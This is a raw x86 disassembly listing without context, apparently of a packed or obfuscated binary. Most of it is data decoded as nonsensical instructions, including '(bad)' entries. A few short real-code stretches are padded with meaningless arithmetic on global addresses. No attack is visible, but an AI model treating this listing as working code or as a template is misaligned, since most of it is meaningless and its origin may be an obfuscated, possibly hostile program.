  407195:	pop    edi
  407196:	jmp    0xffa75311
  40719b:	or     eax,0x5f3c6acc
  4071a0:	sbb    ebx,DWORD PTR [ebp-0x29]
  4071a3:	inc    eax
  4071a4:	dec    eax
  4071a5:	dec    esi
  4071a6:	inc    ebp
  4071a7:	adc    al,0x6c
  4071a9:	imul   ecx,ecx,0x6e
  4071ac:	xchg   DWORD PTR [eax+0x3fc4bd88],esi
  4071b2:	cwde   
  4071b3:	pop    ebx
  4071b4:	or     ebx,eax
  4071b6:	mov    al,ds:0x147f38d3
  4071bb:	and    al,0x10
  4071bd:	in     al,dx
  4071be:	pop    ebp
  4071bf:	sub    al,0xb1
  4071c1:	inc    edx
  4071c2:	mov    bh,ah
  4071c4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4071c5:	aas    
  4071c6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4071c7:	jle    0x4071da
  4071c9:	pop    ebx
  4071ca:	stos   BYTE PTR es:[edi],al
  4071cb:	or     al,0x6b
  4071cd:	fsub   DWORD PTR [ebx]
  4071cf:	fcmove st,st(1)
  4071d1:	rol    BYTE PTR [ebp-0x1621191b],1
  4071d7:	outs   dx,BYTE PTR ds:[esi]
  4071d8:	and    ah,BYTE PTR [edi]
  4071da:	jns    0x4071c7
  4071dc:	data16 mov bl,0x6a
  4071df:	lods   eax,DWORD PTR ds:[esi]
  4071e0:	sbb    ebp,ebx
  4071e2:	test   BYTE PTR [edx+ebp*8-0x3f],bh
  4071e6:	ins    DWORD PTR es:[edi],dx
  4071e7:	jg     0x407208
  4071e9:	sub    BYTE PTR [ecx+0x4a],al
  4071ec:	inc    ebp
  4071ed:	fdivr  DWORD PTR [eax]
  4071ef:	dec    ebp
  4071f0:	and    al,0x49
  4071f2:	cmp    ch,0xb
  4071f5:	mov    eax,ds:0x99d6c783
  4071fa:	adc    esi,DWORD PTR [ebx-0x5ad2fee5]
  407200:	mov    ds:0x9aff0c5c,al
  407205:	sbb    DWORD PTR [esi+0xf],0xffffff82
  407209:	add    al,0xd9
  40720b:	push   ecx
  40720c:	into   
  40720d:	cmp    ch,BYTE PTR [edx-0x36]
  407210:	push   ss
  407211:	jg     0x4071f6
  407213:	lods   eax,DWORD PTR ds:[esi]
  407214:	pop    esi
  407215:	std    
  407216:	adc    DWORD PTR [esp+ebp*1],esp
  407219:	ds mov edx,0xc8b21a76
  40721f:	ins    DWORD PTR es:[edi],dx
  407220:	ss ret 
  407222:	enter  0xe9dd,0xa6
  407226:	pop    ebp
  407227:	mov    dl,0x20
  407229:	inc    ebp
  40722a:	mov    ds:0x50b5e02f,ax
  407230:	out    dx,eax
  407231:	mov    edi,0x8ba0676b
  407236:	pop    esi
  407237:	inc    edi
  407238:	icebp  
  407239:	cld    
  40723a:	pushf  
  40723b:	pop    ecx
  40723c:	pop    ds
  40723d:	cs pop esp
  40723f:	jmp    0x1b0ee267
  407244:	pop    esi
  407245:	xlat   BYTE PTR ds:[ebx]
  407246:	xor    esi,DWORD PTR [edi-0x49]
  407249:	inc    esp
  40724a:	lock or ebx,DWORD PTR [ecx-0x17]
  40724e:	jecxz  0x40725b
  407250:	ror    bl,1
  407252:	test   eax,0xb9879c42
  407257:	imul   edi,DWORD PTR [esi-0x5d55149b],0xb396e24c
  407261:	or     ah,BYTE PTR [edx+0x6c20b2d6]
  407267:	pop    ss
  407268:	cli    
  407269:	lods   eax,DWORD PTR ds:[esi]
  40726a:	fs xchg edx,eax
  40726c:	call   0xe1890833
  407271:	imul   eax,ebx,0xd94b08e3
  407277:	in     eax,0x3d
  407279:	xchg   edi,eax
  40727a:	add    BYTE PTR [ebx-0x698cccb0],al
  407280:	int    0xe4
  407282:	pusha  
  407283:	pop    ds
  407284:	ja     0x407227
  407286:	jmp    0xcfdcb182
  40728b:	popa   
  40728c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40728d:	mov    edx,0xeb3e4e80
  407292:	adc    ah,BYTE PTR [ecx]
  407294:	das    
  407295:	jnp    0x4072fe
  407297:	add    al,0x91
  407299:	pop    esi
  40729a:	add    DWORD PTR [edx+0x7f],ebp
  40729d:	test   eax,0xa32a678f
  4072a2:	imul   edi,DWORD PTR [ebp+0x73fe8d3f],0xffffffa6
  4072a9:	adc    edx,DWORD PTR ds:0x23b629b4
  4072af:	test   BYTE PTR [edi-0x7],bl
  4072b2:	xor    DWORD PTR [esi+0x6dc5f5ae],esi
  4072b8:	aad    0x7c
  4072ba:	push   ecx
  4072bb:	or     BYTE PTR [ebx+edi*1+0xa76d6b0],cl
  4072c2:	retf   
  4072c3:	sbb    BYTE PTR [edx+0x42],0xe3
  4072c7:	fild   QWORD PTR [edi-0x234cd8ec]
  4072cd:	aas    
  4072ce:	dec    edx
  4072cf:	stos   BYTE PTR es:[edi],al
  4072d0:	and    al,0x9d
  4072d2:	mov    bh,0x9e
  4072d4:	jg     0x40726a
  4072d6:	int    0xea
  4072d8:	cmp    ch,BYTE PTR [ebp-0x48]
  4072db:	or     dh,BYTE PTR [edx]
  4072dd:	lea    esp,[edx-0x3d]
  4072e0:	xchg   esp,eax
  4072e1:	test   eax,0x23b98d3f
  4072e6:	sbb    al,0xeb
  4072e8:	xor    bl,dh
  4072ea:	and    eax,0x711ea42f
  4072ef:	mov    ecx,0xd2e91472
  4072f4:	scas   al,BYTE PTR es:[edi]
  4072f5:	sbb    BYTE PTR [esp+eiz*8],0x4b
  4072f9:	or     al,0xe
  4072fb:	dec    ebx
  4072fc:	out    0xc0,eax
  4072fe:	xor    DWORD PTR [eax+eiz*4+0x4da322b8],ebx
  407305:	fdiv   DWORD PTR [edi]
  407307:	int    0x4f
  407309:	sti    
  40730a:	nop
  40730b:	push   esp
  40730c:	mov    bl,0x91
  40730e:	fcomi  st,st(6)
  407310:	call   0x16c6:0x1e1bc5d8
  407317:	pop    es
  407318:	mov    esi,0x3e5d2b76
  40731d:	and    bl,BYTE PTR [edi+ecx*8+0x2b]
  407321:	shl    bh,0x6d
  407324:	xlat   BYTE PTR ds:[ebx]
  407325:	mov    edx,0x7e9ea666
  40732a:	pop    edi
  40732b:	shl    ebp,1
  40732d:	inc    esp
  40732e:	dec    esi
  40732f:	xchg   ah,dl
  407331:	pop    es
  407332:	jmp    0x5674:0x8270d43
  407339:	or     edx,ebp
  40733b:	xlat   BYTE PTR ds:[ebx]
  40733c:	dec    ecx
  40733d:	jb     0x407340
  40733f:	es pop esi
  407341:	out    dx,al
  407342:	inc    ebp
  407343:	ja     0x4072fe
  407345:	jge    0x40734a
  407347:	mov    eax,DWORD PTR [ebp-0xc]
  40734a:	add    DWORD PTR ds:0x42fcd1,0x42e703
  407354:	xor    eax,esi
  407356:	add    DWORD PTR ds:0x42fcfd,0x57f6
  407360:	add    eax,edi
  407362:	xor    DWORD PTR ds:0x42e70f,0x2a11
  40736c:	mov    DWORD PTR [ebp-0x18],eax
  40736f:	mov    DWORD PTR [ebp-0x1c],0xf89c853c
  407376:	mov    BYTE PTR [ebp-0x1],0x67
  40737a:	and    DWORD PTR ds:0x42fcfd,0x0
  407384:	mov    eax,ds:0x42fcfd
  407389:	inc    eax
  40738a:	mov    ds:0x42fcfd,eax
  40738f:	cmp    DWORD PTR ds:0x42fcfd,0xe
  407396:	jne    0x4073a2
  40739c:	call   DWORD PTR ds:0x42e45f
  4073a2:	cmp    DWORD PTR ds:0x42fcfd,0xd
  4073a9:	jne    0x4073ba
  4073af:	mov    eax,ds:0x42fcfd
  4073b4:	inc    eax
  4073b5:	mov    ds:0x42fcfd,eax
  4073ba:	cmp    DWORD PTR ds:0x42fcfd,0x1d
  4073c1:	jb     0x407384
  4073c7:	mov    eax,DWORD PTR [ebp-0xc]
  4073ca:	xor    eax,esi
  4073cc:	and    DWORD PTR ds:0x42e128,0xdb
  4073d6:	add    eax,edi
  4073d8:	or     DWORD PTR ds:0x42e707,0x71a5
  4073e2:	mov    DWORD PTR [ebp-0x18],eax
  4073e5:	adc    eax,0x7137
  4073ea:	jmp    0x407737
  4073ef:	or     DWORD PTR ds:[edi],eax
  4073f2:	(bad)  
  4073f3:	rcl    edx,cl
  4073f5:	cmp    DWORD PTR [ecx],edx
  4073f7:	pop    ecx
  4073f8:	jns    0x4073c5
  4073fa:	popa   
  4073fb:	aas    
  4073fc:	fwait
  4073fd:	out    0x47,eax
  4073ff:	test   edi,0x7d207070
  407405:	jo     0x407477
  407407:	add    bh,ch
  407409:	std    
  40740a:	mov    ebx,0xaed6b7de
  40740f:	mov    esi,0xd7c113ea
  407414:	adc    eax,0x26343882
  407419:	sbb    ebx,esp
  40741b:	nop
  40741c:	retf   0x76b2
  40741f:	xor    al,0x8a
  407421:	ins    BYTE PTR es:[edi],dx
  407422:	xchg   edi,eax
  407423:	es mov ecx,0xe70c0800
  407429:	out    0xb3,eax
  40742b:	(bad)  
  40742c:	cmp    al,0x41
  40742e:	test   al,0xe0
  407430:	inc    ebp
  407431:	ja     0x40744b
  407433:	das    
  407434:	enter  0x66b7,0xb2
  407438:	lods   al,BYTE PTR ds:[esi]
  407439:	sub    al,0xb4
  40743b:	loope  0x4073cb
  40743d:	ins    BYTE PTR es:[edi],dx
  40743e:	pop    es
  40743f:	xor    ch,dl
  407441:	pusha  
  407442:	dec    ecx
  407443:	and    DWORD PTR [edi],ebx
  407445:	xchg   esi,eax
  407446:	cmp    eax,0x982dc086
  40744b:	mov    dh,0x18
  40744d:	add    DWORD PTR [edx+ecx*8-0x3e92bc4],ebx
  407454:	push   ebx
  407455:	push   ecx
  407456:	push   0x40063a46
  40745b:	pop    edi
  40745c:	mov    edx,0x8fd32741
  407461:	in     al,0xfb
  407463:	sbb    ebp,DWORD PTR [edi-0x22]
  407466:	popf   
  407467:	shl    BYTE PTR [edx-0x68],cl
  40746a:	jge    0x4074e2
  40746c:	inc    esi
  40746d:	test   DWORD PTR [eax+0x64672a6b],0xf7b006c6
  407477:	jge    0x407445
  407479:	pop    ecx
  40747a:	loop   0x40744a
  40747c:	mov    al,0xab
  40747e:	(bad)  
  407480:	dec    esi
  407481:	push   0xffffffb0
  407483:	fnstsw WORD PTR [ebp+0x7cefcaf6]
  407489:	js     0x40742c
  40748b:	mov    ds:0x96c28c8d,al
  407490:	push   0xef5640c5
  407495:	call   0x185fd248
  40749a:	xor    al,0x30
  40749c:	or     eax,DWORD PTR [ebp+edx*1+0x25]
  4074a0:	cli    
  4074a1:	cs dec edi
  4074a3:	push   0x67
  4074a5:	adc    dl,0x32
  4074a8:	adc    dh,0x8
  4074ab:	mov    bl,0x2c
  4074ad:	sub    bl,BYTE PTR [ebx+0x151f548c]
  4074b3:	jmp    0xd4589345
  4074b8:	cmp    eax,0x96af13f3
  4074bd:	xor    eax,0x3023a197
  4074c2:	or     BYTE PTR [edx],dl
  4074c4:	scas   eax,DWORD PTR es:[edi]
  4074c5:	mov    al,0xcb
  4074c7:	pop    eax
  4074c8:	es mov cl,0x70
  4074cb:	jae    0x407465
  4074cd:	adc    eax,0x877c3286
  4074d2:	retf   
  4074d3:	fild   WORD PTR [ecx-0x5]
  4074d6:	add    edi,ebx
  4074d8:	jno    0x407474
  4074da:	rcl    BYTE PTR [eax+0x57e7bcc4],0xc1
  4074e1:	and    ah,BYTE PTR [ebp+0x6a64960a]
  4074e7:	shl    BYTE PTR [edi],cl
  4074e9:	arpl   si,ax
  4074eb:	inc    ecx
  4074ec:	ret    0xa7b3
  4074ef:	popa   
  4074f0:	adc    eax,0xcc78431f
  4074f5:	push   ds
  4074f6:	mov    ecx,0x20ee0f86
  4074fb:	ficom  WORD PTR [ebp+0x4e]
  4074fe:	(bad)  
  407501:	js     0x4074c5
  407503:	push   ss
  407504:	(bad)  
  407505:	nop
  407506:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407507:	sub    eax,0x58741a81
  40750c:	es pop edi
  40750e:	call   0xcddbdcc5
  407513:	sar    DWORD PTR [eax-0x36],cl
  407516:	jo     0x407547
  407518:	mov    eax,ds:0x735dbe33
  40751d:	mov    ch,0xbf
  40751f:	lds    ecx,FWORD PTR es:[ebx]
  407522:	fadd   DWORD PTR [esi+eax*8]
  407525:	out    0x9f,al
  407527:	je     0x4074f0
  407529:	loopne 0x407522
  40752b:	cli    
  40752c:	adc    ch,BYTE PTR [ecx-0x25087fe5]
  407532:	out    0x61,eax
  407534:	sbb    DWORD PTR [ecx-0x33],0x3fc3954d
  40753b:	cs mov ch,0x9d
  40753e:	aam    0x2
  407540:	cmc    
  407541:	stc    
  407542:	mov    al,ds:0x3d28b1ea
  407547:	bound  ebx,QWORD PTR [edx]
  407549:	adc    ch,BYTE PTR [edx]
  40754b:	outs   dx,DWORD PTR ds:[esi]
  40754c:	jmp    0x86ed6c49
  407551:	pop    ecx
  407552:	fnsave [eax]
  407554:	inc    esi
  407555:	mov    al,ds:0xd6f3793f
  40755a:	pop    esi
  40755b:	imul   eax,DWORD PTR [edi+0x768560d0],0xa618e2be
  407565:	scas   eax,DWORD PTR es:[edi]
  407566:	sub    eax,0x8efc8511
  40756b:	stos   BYTE PTR es:[edi],al
  40756c:	mov    al,0x2
  40756e:	xchg   ecx,eax
  40756f:	sar    BYTE PTR [eax-0x693725cb],0x19
  407576:	sahf   
  407577:	jb     0x4075c7
  407579:	push   cs
  40757a:	sbb    ebx,edi
  40757c:	mov    al,0x84
  40757e:	pop    edx
  40757f:	xor    eax,0xaba298c7
  407584:	fwait
  407585:	and    DWORD PTR [eax-0x7b9102c9],0x5
  40758c:	mov    al,0x70
  40758e:	push   ebp
  40758f:	sub    DWORD PTR [esi],0x33
  407592:	and    BYTE PTR [edx+0xd],al
  407595:	cmp    BYTE PTR ds:0xd81cc6d8,al
  40759b:	pushf  
  40759c:	aaa    
  40759d:	adc    BYTE PTR cs:[ebp+0x18],ah
  4075a1:	add    DWORD PTR [edi*8+0x3ac92b33],eax
  4075a8:	push   ss
  4075a9:	loop   0x4075cc
  4075ab:	jl     0x40752e
  4075ad:	pop    eax
  4075ae:	loopne 0x4075da
  4075b0:	imul   edi,DWORD PTR [eax],0xf3a12492
  4075b6:	mov    ds:0xd1c46d2c,al
  4075bb:	adc    DWORD PTR [ebp+eiz*8+0x559bee59],ebp
  4075c2:	cmp    ebp,DWORD PTR [ecx+eiz*1+0x1a]
  4075c6:	ret    0x2fb7
  4075c9:	pop    es
  4075ca:	sbb    al,0x75
  4075cc:	pop    ds
  4075cd:	push   ss
  4075ce:	sub    BYTE PTR [edx],dh
  4075d0:	jno    0x4075be
  4075d2:	mov    ecx,0x27d14db5
  4075d7:	pop    esi
  4075d8:	cwde   
  4075d9:	xor    al,0x29
  4075db:	cmp    dh,bh
  4075dd:	push   ebp
  4075de:	sub    DWORD PTR [ecx],edx
  4075e0:	sbb    al,0x61
  4075e2:	fist   WORD PTR [ebx+edi*4+0x42]
  4075e6:	mov    bh,0x17
  4075e8:	mov    al,ds:0x6748ba8b
  4075ed:	lds    ebp,FWORD PTR [edx+0x3cb984e6]
  4075f3:	lds    esi,FWORD PTR [esi+0x6cdb5822]
  4075f9:	sub    DWORD PTR [esi-0x9],0xffffffcb
  4075fd:	and    al,dl
  4075ff:	adc    eax,0x243469e
  407604:	out    0x6c,eax
  407606:	mov    dl,0x50
  407608:	in     al,dx
  407609:	mov    ebp,0xa9db0058
  40760e:	or     esi,edi
  407610:	push   ecx
  407611:	pusha  
  407612:	pop    ecx
  407613:	jb     0x4075d3
  407615:	in     al,dx
  407616:	add    DWORD PTR [edi],esi
  407618:	loopne 0x4075ff
  40761a:	std    
  40761b:	sub    eax,0x4ded6e9f
  407620:	sub    eax,0x1dcac523
  407625:	lahf   
  407626:	mov    al,0xbf
  407628:	add    ah,ch
  40762a:	inc    edx
  40762b:	ins    DWORD PTR es:[edi],dx
  40762c:	sbb    BYTE PTR [esi+0x3f],bl
  40762f:	sbb    DWORD PTR ds:0x118e0e09,ecx
  407635:	call   0xdf36:0x58dd77f2
  40763c:	sub    ah,BYTE PTR [edx]
  40763e:	addr16 in eax,0xf4
  407641:	mov    edx,0xd3ab5293
  407646:	or     ecx,esp
  407648:	xchg   ebx,eax
  407649:	xor    eax,0x1739c927
  40764e:	iret   
  40764f:	(bad)  
  407650:	xor    cl,cl
  407652:	test   al,0xcb
  407654:	das    
  407655:	push   edx
  407656:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407657:	shl    al,cl
  407659:	int    0x15
  40765b:	or     ebp,esp
  40765d:	push   ss
  40765e:	dec    edi
  40765f:	sbb    edi,esp
  407661:	xor    DWORD PTR [edi+0x7289738d],eax
  407667:	push   0xf779c285
  40766c:	sub    BYTE PTR [ebp+0x1e],bh
  40766f:	dec    ebx
  407670:	int3   
  407671:	fld    QWORD PTR [edi]
  407673:	int    0x29
  407675:	mov    ecx,0x99965ac3
  40767a:	retf   0xc940
  40767d:	(bad)  
  40767e:	fidiv  DWORD PTR [ebx-0x3a]
  407681:	loope  0x4076dd
  407683:	mov    bh,BYTE PTR [ebx+0x1ddb2ff4]
  407689:	ja     0x4076b1
  40768b:	imul   ebp,DWORD PTR [ecx+edx*1],0x4b
  40768f:	retf   0x3206
  407692:	inc    ebp
  407693:	in     al,dx
  407694:	es loope 0x40770e
  407697:	(bad)  
  407698:	pcmpgtw mm3,mm5
  40769b:	sub    DWORD PTR [edi+0x9],ecx
  40769e:	dec    ecx
  40769f:	add    eax,0x27d3f1b2
  4076a4:	aas    
  4076a5:	shl    DWORD PTR [esi-0x3ae9789d],1
  4076ab:	push   edx
  4076ac:	(bad)
  4076af:	push   ebx
  4076b0:	xor    DWORD PTR [edi],ebp
  4076b2:	push   ds
  4076b3:	xor    BYTE PTR [esi-0x49],dh
  4076b6:	mov    ebp,0x73c79261
  4076bb:	(bad)  
  4076bc:	mov    edi,0xe7922309
  4076c1:	mov    ebx,esp
  4076c3:	nop
  4076c4:	mov    edi,0xb096f976
  4076c9:	jmp    DWORD PTR [ebx]
  4076cb:	rol    BYTE PTR [ebx],cl
  4076cd:	bound  edx,QWORD PTR [eax-0x32f13d8a]
  4076d3:	int    0x19
  4076d5:	cmp    edx,edi
  4076d7:	jmp    0x9e5503f2
  4076dc:	cmp    al,0xf7
  4076de:	aaa    
  4076df:	cmp    edi,esp
  4076e1:	mov    dh,0x14
  4076e3:	sub    BYTE PTR [edi],0xa4
  4076e6:	cmp    DWORD PTR [edx+0x16],0x67
  4076ea:	pop    esp
  4076eb:	add    ecx,0x595329e8
  4076f1:	xchg   esp,eax
  4076f2:	fcomi  st,st(2)
  4076f4:	(bad)  
  4076f5:	in     al,dx
  4076f6:	mov    bh,0xf5
  4076f8:	iret   
  4076f9:	jbe    0x407702
  4076fb:	mov    al,0xd9
  4076fd:	inc    ecx
  4076fe:	adc    BYTE PTR [ebp+0x3d24f5d2],bh
  407704:	mov    bh,0x28
  407706:	xchg   ecx,eax
  407707:	cmp    al,0x12
  407709:	xor    edx,0x67
  40770c:	in     eax,dx
  40770d:	mov    dh,BYTE PTR [edi]
  40770f:	sbb    DWORD PTR [ebx],esp
  407711:	mov    fs,WORD PTR ds:0x7680db47
  407717:	in     eax,dx
  407718:	and    al,0x44
  40771a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40771b:	shl    ebx,1
  40771d:	call   0xbac8:0x8a3cfae
  407724:	ror    BYTE PTR [eax-0x6d90b728],1
  40772a:	push   es
  40772b:	sub    al,BYTE PTR [edi-0x7b4fa6b8]
  407731:	clc    
  407732:	mov    esp,0xfd3afee2
  407737:	mov    eax,DWORD PTR [ebp-0x24]
  40773a:	xor    eax,esi
  40773c:	add    eax,edi
  40773e:	adc    DWORD PTR ds:0x42e11c,0x42fd09
  407748:	push   eax
  407749:	inc    eax
  40774a:	mov    eax,DWORD PTR [ebp-0x28]
  40774d:	sbb    DWORD PTR ds:0x42fcd1,0x6777
  407757:	xor    eax,esi
  407759:	add    eax,edi
  40775b:	push   eax
  40775c:	mov    eax,DWORD PTR [ebp-0x1c]
  40775f:	or     DWORD PTR ds:0x42e6ef,0x4a3f
  407769:	xor    eax,esi
  40776b:	add    DWORD PTR ds:0x42fcf1,0x266c
  407775:	add    eax,edi
  407777:	xor    DWORD PTR ds:0x42e70f,0x42e6eb
  407781:	push   eax
  407782:	lea    eax,[ebp-0x78]
  407785:	push   eax
  407786:	add    DWORD PTR ds:0x42e6ff,0x5eb6
  407790:	push   DWORD PTR [ebp-0xc]
  407793:	adc    DWORD PTR ds:0x42e703,0x2bbb
  40779d:	push   DWORD PTR [ebp-0x14]
  4077a0:	call   0x405e60
  4077a5:	adc    DWORD PTR ds:0x42fce5,0x42fd6e
  4077af:	test   eax,eax
  4077b1:	je     0x407e83
  4077b7:	lea    eax,[ebp-0x78]
  4077ba:	sbb    DWORD PTR ds:0x42fd82,0x6660
  4077c4:	push   eax
  4077c5:	mov    eax,DWORD PTR [ebp-0x14]
  4077c8:	jmp    0x407b15
  4077cd:	xlat   BYTE PTR ds:[ebx]
  4077ce:	and    BYTE PTR [eax+eiz*8+0x73],ch
  4077d2:	ins    BYTE PTR es:[edi],dx
  4077d3:	push   ebx
  4077d4:	aaa    
  4077d5:	pop    edx
  4077d6:	push   ecx
  4077d7:	push   ebx
  4077d8:	sahf   
  4077d9:	xor    eax,0xa7aefa4d
  4077de:	int3   
  4077df:	jo     0x407851
  4077e1:	and    BYTE PTR [ebp+0x70],bh
  4077e4:	jo     0x4077b4
  4077e6:	fdivrp st(7),st
  4077e8:	mov    esi,ebp
  4077ea:	xchg   BYTE PTR [eax-0x6e],bh
  4077ed:	cs xor al,0x10
  4077f0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4077f1:	icebp  
  4077f2:	inc    esp
  4077f3:	adc    BYTE PTR [esi],dl
  4077f5:	push   edx
  4077f6:	fbld   TBYTE PTR [edx+0x1f]
  4077f9:	cmp    dl,BYTE PTR [edi+0x283086d5]
  4077ff:	inc    esp
  407800:	sar    BYTE PTR [esi-0x7e025cb1],0xe0
  407807:	cld    
  407808:	adc    eax,0xffc32d80
  40780e:	sahf   
  40780f:	je     0x407827
  407811:	jmp    0x40783c
  407813:	push   edx
  407814:	pusha  
  407815:	gs jg  0x4077c5
  407818:	push   es
  407819:	cdq    
  40781a:	inc    edx
  40781b:	(bad)  
  40781c:	xor    eax,0xf084c3fd
  407821:	rol    DWORD PTR [esi+edi*2-0x2e],0xc0
  407826:	in     al,0x8c
  407828:	scas   eax,DWORD PTR es:[edi]
  407829:	xchg   ecx,eax
  40782a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40782b:	jnp    0x4077c6
  40782d:	test   ch,ch
  40782f:	xchg   ebp,eax
  407830:	das    
  407831:	and    dl,bl
  407833:	ficom  WORD PTR [esi+edx*8+0xd]
  407837:	dec    ebp
  407838:	mov    ch,0x76
  40783a:	push   esi
  40783b:	hlt    
  40783c:	dec    ecx
  40783d:	and    ch,0x84
  407840:	cwde   
  407841:	push   eax
  407842:	loop   0x407847
  407844:	adc    DWORD PTR [eax+0x349b25ef],0x46
  40784b:	idiv   BYTE PTR [ebx-0x4d431f2e]
  407851:	repnz or ecx,edx
  407854:	cmp    BYTE PTR [esi+0x36],ch
  407857:	mov    esi,?
  407859:	retf   
  40785a:	ret    
  40785b:	inc    esi
  40785c:	xchg   edx,eax
  40785d:	dec    edi
  40785e:	loop   0x40784f
  407860:	inc    edi
  407861:	jne    0x40783f
  407863:	scas   al,BYTE PTR es:[edi]
  407864:	and    eax,0xede58d55
  407869:	loopne 0x4078df
  40786b:	add    al,0x90
  40786d:	gs gs adc al,0xed
  407871:	and    DWORD PTR [edx],ebx
  407873:	cmp    eax,0xbb0b3382
  407878:	mov    eax,0xc554ff7c
  40787d:	jbe    0x407881
  40787f:	xor    dh,BYTE PTR ds:[eax-0x5d]
  407883:	push   esi
  407884:	sahf   
  407885:	sar    DWORD PTR [ecx+0x470159f3],0xa4
  40788c:	cdq    
  40788d:	out    0xf3,eax
  40788f:	shl    BYTE PTR [eax],cl
  407891:	mov    ?,ecx
  407893:	pop    edx
  407894:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407895:	add    dh,BYTE PTR [ebp-0x46ddf8eb]
  40789b:	xchg   DWORD PTR [esi],ebx
  40789d:	scas   eax,DWORD PTR es:[edi]
  40789e:	ret    
  40789f:	cld    
  4078a0:	jo     0x4078e3
  4078a2:	push   es
  4078a3:	sbb    ah,cl
  4078a5:	popa   
  4078a6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4078a7:	jmp    0x40791b
  4078a9:	or     eax,0x4cba5801
  4078ae:	adc    ebx,DWORD PTR [esi]
  4078b0:	xchg   edx,eax
  4078b1:	jle    0x4078af
  4078b3:	stos   BYTE PTR es:[edi],al
  4078b4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4078b5:	xchg   esi,eax
  4078b6:	scas   eax,DWORD PTR es:[edi]
  4078b7:	std    
  4078b8:	xchg   ebp,eax
  4078b9:	dec    edx
  4078ba:	push   ebp
  4078bb:	xchg   ecx,eax
  4078bc:	mov    esp,0xdffd285c
  4078c1:	xor    edi,ebx
  4078c3:	cmp    BYTE PTR [ebx-0x3954465b],ah
  4078c9:	and    bl,BYTE PTR [esi-0x5]
  4078cc:	inc    eax
  4078cd:	scas   al,BYTE PTR es:[edi]
  4078ce:	js     0x40789c
  4078d0:	sub    eax,0x2a5f8ba1
  4078d5:	sbb    cl,BYTE PTR [ebp+0x47]
  4078d8:	test   al,0x95
  4078da:	adc    DWORD PTR es:[edx+0x5b32df17],eax
  4078e1:	inc    edx
  4078e2:	icebp  
  4078e3:	fdivr  st,st(6)
  4078e5:	xor    eax,0xf146cbdd
  4078ea:	shl    DWORD PTR [edx-0x57e56e37],cl
  4078f0:	test   dh,dh
  4078f2:	xchg   esi,eax
  4078f3:	xchg   BYTE PTR ds:0x475e631f,dh
  4078f9:	mov    al,ds:0xeea12121
  4078fe:	adc    esp,DWORD PTR [edx-0x1dbf51f2]
  407904:	and    dh,BYTE PTR [edi]
  407906:	fwait
  407907:	out    dx,al
  407908:	jae    0x40788b
  40790a:	and    ch,dl
  40790c:	mov    WORD PTR [esi-0x3adc3a61],ds
  407912:	retf   
  407913:	pop    ss
  407914:	jp     0x4078a7
  407916:	fiadd  WORD PTR [ebp+0xe]
  407919:	mov    ds:0x341c17dc,eax
  40791e:	imul   edx,esi,0x24
  407921:	cdq    
  407922:	cmp    DWORD PTR [edx],esp
  407924:	xor    BYTE PTR [edi-0x75f9afaa],cl
  40792a:	repz and dl,BYTE PTR [ebx-0x29]
  40792e:	rcl    DWORD PTR [esp+edi*2-0x12],0x5d
  407933:	xor    bp,dx
  407936:	(bad)  
  407937:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407938:	cmp    esp,DWORD PTR [edi]
  40793a:	mov    bh,0xd2
  40793c:	mov    BYTE PTR [edx+ebp*2-0x5ab0d85e],bh
  407943:	mov    edi,0x531787a5
  407948:	dec    ebp
  407949:	xor    al,0x42
  40794b:	dec    esp
  40794c:	fiadd  WORD PTR [esi+0x60]
  40794f:	loop   0x407913
  407951:	(bad)  
  407952:	lods   eax,DWORD PTR ds:[esi]
  407953:	outs   dx,BYTE PTR ds:[esi]
  407954:	mov    DWORD PTR [edx+edx*8-0x491e021c],ebp
  40795b:	adc    DWORD PTR [edx],ecx
  40795d:	cmp    edx,edi
  40795f:	arpl   di,di
  407961:	add    ch,BYTE PTR [edi-0x775a69ff]
  407967:	mov    bl,0x79
  407969:	(bad)  
  40796c:	jb     0x407943
  40796e:	scas   eax,DWORD PTR es:[edi]
  40796f:	add    BYTE PTR [ebx-0x550920ad],bl
  407975:	adc    eax,edi
  407977:	inc    edx
  407978:	pop    ebx
  407979:	fidivr DWORD PTR [esi]
  40797b:	les    ebp,FWORD PTR [ebp-0x11]
  40797e:	inc    esp
  40797f:	pop    eax
  407980:	push   es
  407981:	fisttp WORD PTR [edx+0x53]
  407984:	(bad)  
  407985:	out    dx,al
  407986:	sbb    al,0xb
  407988:	in     eax,dx
  407989:	inc    edx
  40798a:	and    eax,0x5186e59a
  40798f:	mov    eax,ds:0xc252312
  407994:	mov    al,0x6d
  407996:	sub    eax,0x3b4bd011
  40799b:	in     eax,dx
  40799c:	fdivp  st(3),st
  40799e:	mov    esp,0xe86c2683
  4079a3:	jo     0x407989
  4079a5:	xchg   esp,eax
  4079a6:	cmp    eax,0x752403ee
  4079ab:	(bad)  [esi+0x67]
  4079ae:	dec    esp
  4079af:	jecxz  0x4079c5
  4079b1:	cmp    eax,0x5c5fe69e
  4079b6:	test   BYTE PTR [edi+0x4621966],ch
  4079bc:	or     bh,dl
  4079be:	sub    eax,0xbc2bbde9
  4079c3:	jmp    0xadbb:0x43709c97
  4079ca:	jae    0x40797d
  4079cc:	je     0x407a33
  4079ce:	xchg   ebx,eax
  4079cf:	inc    esi
  4079d0:	int3   
  4079d1:	sbb    edi,esi
  4079d3:	add    BYTE PTR [ecx],ah
  4079d5:	mov    esp,0xa2c87ed7
  4079da:	jp     0x407980
  4079dc:	int3   
  4079dd:	outs   dx,DWORD PTR ds:[esi]
  4079de:	mov    DWORD PTR [ebx+0x14],ecx
  4079e1:	add    esp,DWORD PTR [esi]
  4079e3:	enter  0xe634,0x0
  4079e7:	cdq    
  4079e8:	xor    edx,ebp
  4079ea:	mov    dl,0x8d
  4079ec:	sub    eax,0xf1863fca
  4079f1:	daa    
  4079f2:	pusha  
  4079f3:	pop    edi
  4079f4:	mov    dh,0xd1
  4079f6:	dec    edi
  4079f7:	push   eax
  4079f8:	adc    al,0x85
  4079fa:	mov    al,ds:0xf558a02f
  4079ff:	adc    eax,0x19e8e1db
